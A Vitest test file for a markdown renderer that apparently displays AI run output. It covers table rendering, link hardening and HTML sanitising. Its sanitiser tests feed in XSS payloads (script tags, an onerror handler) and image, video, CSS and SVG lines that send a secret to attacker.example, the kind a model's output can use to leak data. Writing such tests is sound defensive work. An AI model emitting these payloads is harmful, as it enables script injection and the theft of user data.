import { describe, expect, it } from 'vitest';
import { renderMarkdown } from './render-markdown';

const tableMarkdown = `Three earlier runs hit the same retry loop.

| Run | Started | Outcome | What happened |
| --- | --- | --- | --- |
| \`run-7f3a\` | 09:41:03 | error | Three retries, then a timeout from the vector store |
| \`run-c21d\` | 09:52:47 | ok | Two retries; the third attempt returned 40 documents |
| \`run-08e1\` | 10:05:12 | ok | One retry; slow but within budget |

The common factor is the **first retrieval call** after a cold start.`;

describe('renderMarkdown', () => {
	describe('tables enabled', () => {
		it('renders GitHub-flavoured tables with id and time columns marked narrow', () => {
			const html = renderMarkdown(tableMarkdown, true);
			const document = new DOMParser().parseFromString(html, 'text/html');
			const rows = [...document.querySelectorAll<HTMLTableRowElement>('tbody tr')];
			expect(rows).toHaveLength(3);
			const firstRow = [...rows[0]!.cells];
			expect(firstRow.map((cell) => cell.classList.contains('cell--narrow'))).toEqual([
				true,
				true,
				false,
				false
			]);
			expect(document.querySelector('strong')?.textContent).toBe('first retrieval call');
		});

		it('strips scripts and event handlers', () => {
			const html = renderMarkdown(
				'Hello <script>alert(1)</script><img src=x onerror="alert(1)">',
				true
			);
			expect(html).not.toContain('<script');
			expect(html).not.toContain('onerror');
			expect(html).toContain('Hello');
		});

		it('keeps inline code and opens external links in a hardened new tab', () => {
			const html = renderMarkdown('See `retrieve_documents` at [docs](https://example.com).', true);
			expect(html).toContain('<code>retrieve_documents</code>');
			const link = new DOMParser().parseFromString(html, 'text/html').querySelector('a')!;
			expect(link.getAttribute('href')).toBe('https://example.com');
			expect(link.getAttribute('target')).toBe('_blank');
			expect(link.getAttribute('rel')).toBe('noopener noreferrer');
		});

		it('leaves same-origin links alone', () => {
			const html = renderMarkdown('[this run](/projects/p/logs?trace=7f3a)', true);
			const link = new DOMParser().parseFromString(html, 'text/html').querySelector('a')!;
			expect(link.getAttribute('href')).toBe('/projects/p/logs?trace=7f3a');
			expect(link.hasAttribute('target')).toBe(false);
			expect(link.hasAttribute('rel')).toBe(false);
		});

		it('strips everything that would make the browser fetch a URL of the model’s choosing', () => {
			const html = renderMarkdown(
				[
					'![](https://attacker.example/p?q=secret)',
					'<img src="https://attacker.example/i">',
					'<video src="https://attacker.example/v"></video>',
					'<p style="background:url(https://attacker.example/s)">styled</p>',
					'<svg><image href="https://attacker.example/x"/></svg>'
				].join('\n\n'),
				true
			);
			expect(html).not.toContain('attacker.example');
			expect(html).not.toContain('<img');
			expect(html).not.toContain('<video');
			expect(html).not.toContain('style=');
			expect(html).not.toContain('<svg');
			expect(html).toContain('styled');
		});
	});

	// The `tables` flag defaults to `false`. These cases pin today's
	// pre-existing rendering (no GFM, pipe syntax left as literal text) so a
	// future change can't silently widen the default. They run after the
	// tables-enabled cases above deliberately: if the custom table renderer
	// ever leaked onto the shared `marked` singleton instead of staying on
	// its own `Marked` instance, these would be the ones to catch it.
	describe('tables disabled (default)', () => {
		it('does not parse pipe tables into a <table>', () => {
			const html = renderMarkdown(tableMarkdown);
			expect(html).not.toContain('<table');
			expect(html).not.toContain('cell--narrow');
		});

		it('renders the same as an explicit renderMarkdown(source, false) call', () => {
			expect(renderMarkdown(tableMarkdown)).toBe(renderMarkdown(tableMarkdown, false));
		});

		it('still applies the hardened sanitizer policy', () => {
			const html = renderMarkdown('<img src="https://attacker.example/i" style="color:red">');
			expect(html).not.toContain('<img');
			expect(html).not.toContain('style=');
		});

		it('still hardens external links', () => {
			const html = renderMarkdown('[docs](https://example.com)');
			const link = new DOMParser().parseFromString(html, 'text/html').querySelector('a')!;
			expect(link.getAttribute('target')).toBe('_blank');
			expect(link.getAttribute('rel')).toBe('noopener noreferrer');
		});
	});
});
